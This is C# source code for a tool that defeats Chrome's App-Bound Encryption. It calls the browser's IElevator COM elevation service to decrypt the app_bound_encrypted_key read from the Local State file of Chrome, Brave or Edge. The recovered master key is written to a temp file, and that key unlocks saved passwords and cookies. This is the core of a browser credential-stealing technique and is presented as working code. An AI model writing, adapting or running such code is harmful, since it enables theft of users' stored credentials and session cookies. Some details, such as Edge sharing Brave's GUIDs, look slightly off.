using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using System.Diagnostics;

namespace ChromeAppBoundDecryptor
{
    enum ProtectionLevel
    {
        None = 0,
        PathValidationOld = 1,
        PathValidation = 2,
        Max = 3
    }

    [ComImport]
    [Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IElevator
    {
        int RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
            [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
            [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
            [MarshalAs(UnmanagedType.LPWStr)] string session_id,
            uint caller_proc_id,
            out IntPtr proc_handle
        );

        int EncryptData(
            ProtectionLevel protection_level,
            [MarshalAs(UnmanagedType.BStr)] string plaintext,
            out IntPtr ciphertext,
            out uint last_error
        );

        int DecryptData(
            [MarshalAs(UnmanagedType.BStr)] string ciphertext,
            out IntPtr plaintext,
            out uint last_error
        );
    }

    class Program
    {
        const int KeySize = 32;
        static readonly byte[] KeyPrefix = { (byte)'A', (byte)'P', (byte)'P', (byte)'B' };

        static void Main(string[] args)
        {
            try
            {
                Log("", true);

                string browserType = DetectBrowserType();
                BrowserConfig config = GetBrowserConfig(browserType);

                Console.WriteLine("[+] Browser detected: " + config.Name);

                var elevator = CreateElevator(config.ClsId, config.InterfaceId);
                if (elevator == null)
                {
                    Log("[-] Failed to create IElevator instance.");
                    return;
                }

                Log("[+] IElevator instance created.");

                var encryptedKey = RetrieveEncryptedKeyFromLocalState(config.LocalStatePath);
                if (encryptedKey == null || encryptedKey.Length == 0)
                {
                    Log("[-] No encrypted key found.");
                    return;
                }

                Log("[+] Encrypted key retrieved: " + BytesToHex(encryptedKey.Take(20).ToArray()) + "...");

                string encryptedKeyStr = MarshalBase64ToBSTR(encryptedKey);

                IntPtr plaintextPtr;
                uint lastError;
                int hr = elevator.DecryptData(encryptedKeyStr, out plaintextPtr, out lastError);

                if (hr == 0 && plaintextPtr != IntPtr.Zero)
                {
                    byte[] decryptedBytes = new byte[KeySize];
                    Marshal.Copy(plaintextPtr, decryptedBytes, 0, KeySize);
                    Marshal.FreeBSTR(plaintextPtr);

                    string hexKey = BytesToHex(decryptedBytes);
                    SaveKeyToFile(hexKey);
                    Log("[+] Decryption successful. Key saved.");
                }
                else
                {
                    Log($"[-] Decryption failed. HRESULT: 0x{hr:X8}, LastError: {lastError}");
                }
            }
            catch (Exception ex)
            {
                Log("[-] Exception: " + ex.Message);
            }
        }

        static string DetectBrowserType()
        {
            string exeName = Process.GetCurrentProcess().MainModule.FileName.ToLower();

            if (exeName.Contains("brave"))
                return "brave";
            else if (exeName.Contains("msedge"))
                return "edge";
            else
                return "chrome";
        }

        struct BrowserConfig
        {
            public Guid ClsId;
            public Guid InterfaceId;
            public string ExecutablePath;
            public string LocalStatePath;
            public string Name;
        }

        static BrowserConfig GetBrowserConfig(string browserType)
        {
            if (browserType == "chrome")
            {
                return new BrowserConfig
                {
                    ClsId = new Guid("708860E0-F641-4611-8895-7D867DD3675B"),
                    InterfaceId = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"),
                    ExecutablePath = @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    LocalStatePath = @"\Google\Chrome\User Data\Local State",
                    Name = "Chrome"
                };
            }
            else if (browserType == "brave")
            {
                return new BrowserConfig
                {
                    ClsId = new Guid("576B31AF-6369-4B6B-8560-E4B203A97A8B"),
                    InterfaceId = new Guid("F396861E-0C8E-4C71-8256-2FAE6D759CE9"),
                    ExecutablePath = @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                    LocalStatePath = @"\BraveSoftware\Brave-Browser\User Data\Local State",
                    Name = "Brave"
                };
            }
            else if (browserType == "edge")
            {
                return new BrowserConfig
                {
                    ClsId = new Guid("576B31AF-6369-4B6B-8560-E4B203A97A8B"),
                    InterfaceId = new Guid("F396861E-0C8E-4C71-8256-2FAE6D759CE9"),
                    ExecutablePath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    LocalStatePath = @"\Microsoft\Edge\User Data\Local State",
                    Name = "Edge"
                };
            }

            throw new ArgumentException("Unsupported browser type");
        }

        static IElevator CreateElevator(Guid clsid, Guid iid)
        {
            Type type = Type.GetTypeFromCLSID(clsid, true);
            object obj = Activator.CreateInstance(type);

            return (IElevator)obj;
        }

        static byte[] RetrieveEncryptedKeyFromLocalState(string relativeLocalStatePath)
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string fullPath = Path.Combine(appDataPath, relativeLocalStatePath.TrimStart('\\'));

            if (!File.Exists(fullPath))
            {
                Log("[-] Local State file not found: " + fullPath);
                return null;
            }

            string content = File.ReadAllText(fullPath);

            const string searchKey = "\"app_bound_encrypted_key\":\"";
            int start = content.IndexOf(searchKey);
            if (start == -1)
            {
                Log("[-] app_bound_encrypted_key not found.");
                return null;
            }

            start += searchKey.Length;
            int end = content.IndexOf('"', start);
            if (end == -1)
            {
                Log("[-] Malformed app_bound_encrypted_key.");
                return null;
            }

            string base64 = content.Substring(start, end - start);
            byte[] decoded = Convert.FromBase64String(base64);

            if (!decoded.Take(KeyPrefix.Length).SequenceEqual(KeyPrefix))
            {
                Log("[-] Invalid key prefix.");
                return null;
            }

            return decoded.Skip(KeyPrefix.Length).ToArray();
        }

        static string MarshalBase64ToBSTR(byte[] data)
        {
            return Encoding.UTF8.GetString(data);
        }

        static void SaveKeyToFile(string key)
        {
            string tempPath = Path.GetTempPath();
            string filePath = Path.Combine(tempPath, "chrome_appbound_key.txt");

            File.WriteAllText(filePath, key);
        }

        static string BytesToHex(byte[] bytes)
        {
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        static void Log(string message, bool overwrite = false)
        {
            string tempPath = Path.GetTempPath();
            string logFile = Path.Combine(tempPath, "chrome_decrypt.log");

            if (overwrite)
                File.WriteAllText(logFile, message + Environment.NewLine);
            else
                File.AppendAllText(logFile, message + Environment.NewLine);
        }
    }
}
